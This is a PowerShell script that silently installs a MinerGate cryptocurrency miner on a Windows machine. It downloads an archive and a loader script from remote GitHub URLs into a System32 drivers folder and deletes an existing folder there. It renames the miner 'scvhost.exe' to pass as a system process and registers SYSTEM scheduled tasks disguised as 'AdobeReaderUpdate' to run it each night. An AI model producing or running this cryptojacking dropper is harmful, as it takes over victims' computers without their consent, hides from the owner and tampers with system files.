# Download MinerGate CLI
$url = "https://github.com/diggles9991/MG/raw/master/etc.zip"
$output = "C:\Windows\System32\drivers\en-US\etc.zip"
$wc = New-Object System.Net.WebClient
$wc.DownloadFile($url, $output)


# Delete existing etc folder
Remove-Item C:\Windows\System32\drivers\en-US\etc -Recurse


# Extract zip file
Add-Type -AssemblyName System.IO.Compression.FileSystem
function Unzip
{
    param([string]$zipfile, [string]$outpath)

    [System.IO.Compression.ZipFile]::ExtractToDirectory($zipfile, $outpath)
}
Unzip "C:\Windows\System32\drivers\en-US\etc.zip" "C:\Windows\System32\drivers\en-US\"


# Change Directory
CD C:\Windows\System32\drivers\en-US\

#Disabled
# Rename extracted folder
#$oldpath = Get-ChildItem | ?{ $_.PSIsContainer }
#Rename-Item $oldpath.name etc


# Remove zip
Remove-Item etc.zip


# Create renamed copy of Miner
Copy-Item C:\Windows\System32\drivers\en-US\etc\minergate-cli.exe C:\Windows\System32\drivers\en-US\etc\scvhost.exe


#Delete Miner
Remove-Item C:\Windows\System32\drivers\en-US\etc\minergate-cli.exe


# Create scheduled Start Task
SCHTASKS /Create /RU "SYSTEM" /tn "AdobeReaderUpdate" /sc Weekly /d * /st 18:00:00 /du 11:55 /k /ri 30 /tr "powershell.exe C:\Windows\System32\drivers\en-US\etc\Line.ps1"


# Create scheduled End Task
SCHTASKS /Create /RU "SYSTEM" /tn "AdobeReaderUpdateEnd" /sc Daily /st 06:10:00 /tr "powershell.exe Stop-Process -Name scvhost"


# Download Loader
$url2 = "https://raw.githubusercontent.com/diggles9991/RunMG/master/Line.ps1"
$output2 = "C:\Windows\System32\drivers\en-US\etc\Line.ps1"
$wc = New-Object System.Net.WebClient
$wc.DownloadFile($url2, $output2)
